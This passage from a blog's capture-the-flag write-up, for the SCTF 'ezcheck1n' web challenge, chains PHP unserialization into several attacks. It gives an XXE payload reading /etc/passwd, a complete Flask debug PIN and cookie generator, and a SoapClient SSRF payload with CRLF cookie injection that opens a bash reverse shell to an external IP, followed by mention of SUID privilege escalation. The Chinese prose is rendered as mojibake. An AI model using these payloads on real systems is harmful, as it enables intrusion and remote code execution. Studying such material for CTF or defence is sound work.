<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>)){</span><br><span class="line">        <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>],<span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>å¦‚æœ$propertiesæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå°±newä¸€ä¸ª$typeå¯¹è±¡ï¼Œå¹¶ä¸”ä¼ å…¥å‚æ•°ä¸º<code>$properties[0],$properties[1]</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è®©$typeä¸º<code>SimpleXMLElement</code>è¿™ä¸ªåŸç”Ÿç±»ï¼Œè¿™ä¸ªåŸç”Ÿç±»å¯ä»¥è§£æä¸€ä¸ªXMLæ–‡æ¡£ï¼Œå¹¶ä¸”åˆå§‹åŒ–æ—¶å‚æ•°å¦‚ä¸‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°<code>data_is_url</code>ï¼Œé»˜è®¤ä¸ºfalseï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°dataéœ€è¦ä¼ å…¥ä¸€ä¸ªxmlï¼š<br><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624222702721.png"></p>
<p>è¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªpayloadï¼Œä»è€Œå®ç°XXEï¼Œè¿™æ ·æˆ‘ä»¬å°±å®ç°äº†ä»»æ„æ–‡ä»¶è¯»å–ï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pro</span> = <span class="keyword">array</span>(<span class="string">'&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;'</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">"properties"</span>=&gt;<span class="variable">$pro</span>,<span class="string">"type"</span>=&gt;SimpleXMLElement);</span><br><span class="line"><span class="comment">// print_r($arr);</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br></pre></td></tr></tbody></table></figure>

<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624224532021.png"></p>
<p>å†çœ‹elseçš„éƒ¨åˆ†ï¼Œå¦‚æœ$propertiesä¸æ˜¯æ•°ç»„ï¼Œå°±ä¼šè®¿é—®è¿œç¨‹çš„ä¸€ä¸ªæœåŠ¡ï¼Œé¢˜ç›®æç¤ºäº†/app/app.pyï¼Œæˆ‘ä»¬è¿™é‡Œxxeçœ‹ä¸€ä¸‹ä»£ç ï¼š    </p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>)){</span><br><span class="line">        <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>],<span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">'http://127.0.0.1:5000/'</span>.<span class="variable">$properties</span>);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>å‘ç°FlaskæœåŠ¡å¼€å¯äº†debugï¼Œç®—pinç å°±å¯ä»¥äº†ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624230721367.png"></p>
<p>æ”¾ä¸ªç®—pinç çš„è„šæœ¬ï¼Œè¿˜èƒ½é¡ºå¸¦ç®—å‡ºcookieï¼Œæ–¹ä¾¿åé¢ç›´æ¥ç”¨ï¼š</p>
<p>é¡¹ç›®åœ°å€ï¼š<a class="link" target="_blank" rel="noopener" href="https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code/blob/main/get_flask_pin_and_cookie.py">https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code/blob/main/get_flask_pin_and_cookie.py<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tested on Python3.8</span></span><br><span class="line"><span class="comment"># This script generates a Cookie based on a legitimate PIN code.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you are using a Python version lower than 3.8 and you were unable to generate a Cookie or PIN, use the script at the link below.</span></span><br><span class="line"><span class="comment"># It is based on the following script, which generates only the PIN code:</span></span><br><span class="line"><span class="comment"># https://gist.githubusercontent.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42/raw/028384ef695e376d412f9276ad27b2c916d4f748/get_flask_pin.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In different versions of python, the hashing algorithm may differ, in this case, sha1 is used.</span></span><br><span class="line"><span class="comment"># There may also be other differences.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">text_type = <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f"<span class="subst">{pin}</span> added salt"</span>.encode(<span class="string">"utf-8"</span>, <span class="string">"replace"</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin</span>(<span class="params">args</span>):</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    username = args.username</span><br><span class="line">    modname = args.modname</span><br><span class="line">    appname = args.appname</span><br><span class="line">    fname = args.basefile</span><br><span class="line">    probably_public_bits = [username, modname, appname, fname]</span><br><span class="line">    private_bits = [args.uuid, args.machineid]</span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, text_type):</span><br><span class="line">            bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don't</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">        num = (<span class="string">'%09d'</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don't have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                              <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    hash_pin(rv)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Cookie: "</span>, cookie_name + <span class="string">"="</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(time.time())) + <span class="string">'|'</span> + hash_pin(rv))</span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    versions = [<span class="string">"2.7"</span>, <span class="string">"3.0"</span>, <span class="string">"3.1"</span>, <span class="string">"3.2"</span>, <span class="string">"3.3"</span>, <span class="string">"3.4"</span>, <span class="string">"3.5"</span>, <span class="string">"3.6"</span>, <span class="string">"3.7"</span>, <span class="string">"3.8"</span>]</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">"tool to get the flask debug pin from system information"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--username"</span>, required=<span class="literal">False</span>, default=<span class="string">"www-data"</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"The username of the user running the web server"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--modname"</span>, required=<span class="literal">False</span>, default=<span class="string">"flask.app"</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"The module name (app.__module__ or app.__class__.__module__)"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--appname"</span>, required=<span class="literal">False</span>, default=<span class="string">"Flask"</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"The app name (app.__name__ or app.__class__.__name__)"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--basefile"</span>, required=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"The filename to the base app.py file (getattr(sys.modules.get(modname), '__file__', None))"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--uuid"</span>, required=<span class="literal">True</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"System network interface UUID (/sys/class/net/ens33/address or /sys/class/net/$interface/address)"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--machineid"</span>, required=<span class="literal">True</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"System machine ID (édockerç¯å¢ƒï¼š/etc/machine-id  dockerç¯å¢ƒï¼š /proc/sys/kernel/random/boot_id+/proc/self/cgroup)"</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.basefile <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[!] App.py base path not provided, trying for most versions of python\n"</span>)</span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> versions:</span><br><span class="line">            args.basefile = <span class="string">f"/usr/local/lib/python<span class="subst">{v}</span>/dist-packages/flask/app.py"</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"PIN Python <span class="subst">{v}</span>: <span class="subst">{get_pin(args)}</span>\n"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"PIN: "</span>, get_pin(args))</span><br></pre></td></tr></tbody></table></figure>

<p>å…¶ä¸­éœ€è¦è·å–çš„å‚æ•°çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<ul>
<li><p>usernameï¼šé€šè¿‡æŸ¥çœ‹/etc/passwdå¯ä»¥çœ‹åˆ°å…¨éƒ¨çš„ç”¨æˆ·ï¼Œæœ‰ä¸€ä¸ªå«åšappçš„ï¼Œæ˜¯è¿™ä¸ªç”¨æˆ·</p>
</li>
<li><p>modenameï¼šé»˜è®¤å€¼ä¸ºflask.appï¼Œä¸éœ€è¦æ”¹</p>
</li>
<li><p>appnameï¼šé»˜è®¤å€¼ä¸ºFlaskï¼Œä¸éœ€è¦æ”¹</p>
</li>
<li><p>basefileï¼šapp.pyçš„å­˜æ”¾ä½ç½®ï¼Œè¿™é‡Œå¯ä»¥çŒœï¼Œå¤§éƒ¨åˆ†é»˜è®¤éƒ½æ˜¯<code>/usr/lib/python3.x/site-packages/flask/app.py</code>ï¼Œè¿™é‡Œpythonç‰ˆæœ¬æ˜¯3.8ï¼ˆçŒœçš„ï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡FileSystemIteratorè¿™ä¸ªåŸç”Ÿç±»æ¥çœ‹ä¸€ä¸‹å…·ä½“çš„ç‰ˆæœ¬ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191325115.png"></p>
</li>
<li><p>uuidï¼šä¸€èˆ¬è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼š<code>/sys/class/net/eth0/address</code>çš„åè¿›åˆ¶</p>
</li>
<li><p>machineidï¼šé¢˜ç›®æ˜¯dockerç¯å¢ƒï¼Œæ‰€ä»¥æ˜¯<code>/proc/sys/kernel/random/boot_id</code>åæ‹¼æ¥<code>/proc/sys/kernel/random/boot_id+/proc/self/cgroup</code>çš„dockeréƒ¨åˆ†</p>
</li>
</ul>
<p>ç®—å‡ºpinç å’Œcookieä¸ºï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191641000.png"></p>
<p>ç„¶åå°±å¯ä»¥è¿›å…¥consoleä¸­æ‰§è¡Œå‘½ä»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥æœ¬åœ°èµ·ä¸€ä¸ªFlaskè¿›å…¥åˆ°è°ƒè¯•æ¨¡å¼ä¸­æ‰§è¡Œå‘½ä»¤çœ‹çœ‹ä¼ å‚æ˜¯ä»€ä¹ˆæ ·çš„ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191950887.png"></p>
<p>æŠ“ä¸€ä¸‹è¾“å…¥pinç æ—¶çš„åŒ…ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192202208.png"></p>
<p>å†æŠ“ä¸€ä¸ªconsoleä¸­æ‰§è¡Œå‘½ä»¤æ—¶çš„åŒ…ï¼ˆè¿™é‡Œå°±ä¼šå‘ç°æ‰§è¡Œå‘½ä»¤æ—¶æ˜¯éœ€è¦Cookieçš„ï¼Œè¿™æ—¶å€™ä¹‹å‰ç®—å¥½çš„Cookieå°±æ´¾ä¸Šç”¨åœºäº†ï¼‰ï¼Œç„¶åè¿™é‡Œå‘ç°å‚æ•°æ˜¯éœ€è¦ä¼ å…¥ä¸€ä¸ªsçš„ï¼Œä¹Ÿå°±æ˜¯FlaskæœåŠ¡çš„SecretKeyï¼Œæˆ‘ä»¬å»è®¿é—®é¢˜ç›®ç¯å¢ƒçš„consoleè·¯ç”±å°±å¯ä»¥çœ‹åˆ°ï¼š<br><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192245257.png"></p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192559845.png"></p>
<p>ç„¶åå°±å¯ä»¥æ„é€ RCEçš„æ•°æ®åŒ…äº†ï¼Œæˆ‘ä»¬ç°åœ¨æœ‰RCEæ‰€éœ€çš„å‚æ•°ï¼Œç„¶åè€ƒè™‘æ˜¯å¦å¯ä»¥é€šè¿‡è¿™é‡Œä¼ å‚ä»è€ŒRCEï¼Œç­”æ¡ˆæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºCookieæ²¡åŠæ³•ä¼ è¿‡å»ï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">'http://127.0.0.1:5000/'</span>.<span class="variable">$properties</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬åˆè¦é€šè¿‡ä¸€ä¸ªåŸç”Ÿç±»æ¥æ„é€ SSRFï¼Œä»è€Œè®¿é—®5000ç«¯å£çš„è¿™ä¸ªFlaskæœåŠ¡äº†ï¼Œç”¨åˆ°çš„æ˜¯SoapClientè¿™ä¸ªåŸç”Ÿç±»ï¼Œå¯ä»¥ç†è§£æˆç›´æ¥å¯¹targetå‘èµ·ä¸€æ¬¡è¯·æ±‚ï¼š</p>
<blockquote>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SoapClient {</span><br><span class="line">    <span class="comment">/* æ–¹æ³• */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br></pre></td></tr></tbody></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª <code>__call</code> æ–¹æ³•ï¼Œå½“ <code>__call</code> æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª <code>__call</code> æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚SoapClient è¿™ä¸ªç±»ä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ã€‚</p>
<p>è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [ï¼Œ<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</li>
</ul>
</blockquote>
<p>çœ‹åˆ°è¿™æ®µä»£ç ï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>)&amp;&amp;<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>))){</span><br><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line"><span class="variable">$object</span> -&gt; <span class="title function_ invoke__">sctf</span>();</span><br></pre></td></tr></tbody></table></figure>

<p>å¯ä»¥çœ‹åˆ°$objectè°ƒç”¨äº†sctf()è¿™ä¸ªæ–¹æ³•ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨_callç„¶åæ‰“SSRF</p>
<p>æ„é€ å‡ºå¦‚ä¸‹payloadï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sop</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">'user_agent'</span>=&gt;<span class="string">"test\r\nCookie: __wzdb2a60e2b19822632a67c=1687701860|11b8517fb9fb"</span>,<span class="string">'location'</span>=&gt;<span class="string">'http://127.0.0.1:5000/console?__debugger__=yes&amp;cmd=__import__("os").popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20/dev/tcp/43.143.246.73/7777%200%3E%261%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9'</span>,<span class="string">'uri'</span>=&gt;<span class="string">'test'</span>));</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">"properties"</span>=&gt;<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sop</span>)));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>æ‹¿åˆ°shellåç›´æ¥suidææƒå°±å¯ä»¥è¯»å–flag</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625221633078.png"></p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625221745358.png"></p>

            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/SCTF/">#SCTF</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/06/08/Shiro550/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Shiro550</span>
                                <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;è¯„è®º
    </div>
    
        
            

    <div class="valine-container">
        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script data-pjax>
          function loadValine() {

            const config = {
              el: '#vcomments',
              appId: 'yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI',
              appKey: '7gIuYJ9YQk94en6wRudankYd',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'Hi speak somethingï¼',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('https://ycemvr5n.api.lncldglobal.com') {
              config.serverURLs = 'https://ycemvr5n.api.lncldglobal.com'
            }

            new Valine(config)

            function getAuthor(language) {
              switch (language) {
                case 'en':
                  return 'Author'
                case 'zh-CN':
                  return 'åšä¸»'
                default:
                  return 'Master'
              }
            }

            // Add "Author" identify
            const getValineDomTimer = setInterval(() => {
              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
              if (vcards.length > 0) {
                let author = 'y1zh3e7'

                if (author) {
                  for (let vcard of vcards) {
                    const vnick_dom = vcard.querySelector('.vhead .vnick')
                    const vnick = vnick_dom.innerHTML
                    if (vnick === author) {
                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                    }
                  }
                }
                clearInterval(getValineDomTimer)
              } else {
                clearInterval(getValineDomTimer)
              }
            }, 2000)
          }

          if ('true' === 'true') {
            const loadValineTimeout = setTimeout(() => {
              loadValine()
              clearTimeout(loadValineTimeout)
            }, 1000)
          } else {
            window.addEventListener('DOMContentLoaded', loadValine)
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SCTF-Web%E5%A4%8D%E7%8E%B0"><span class="nav-text">SCTF-Webå¤ç°</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezcheck1n"><span class="nav-text">ezcheck1n</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pypyp"><span class="nav-text">pypyp?</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2023</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">y1zh3e7</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    è®¿é—®äººæ•°&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    æ€»è®¿é—®é‡&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
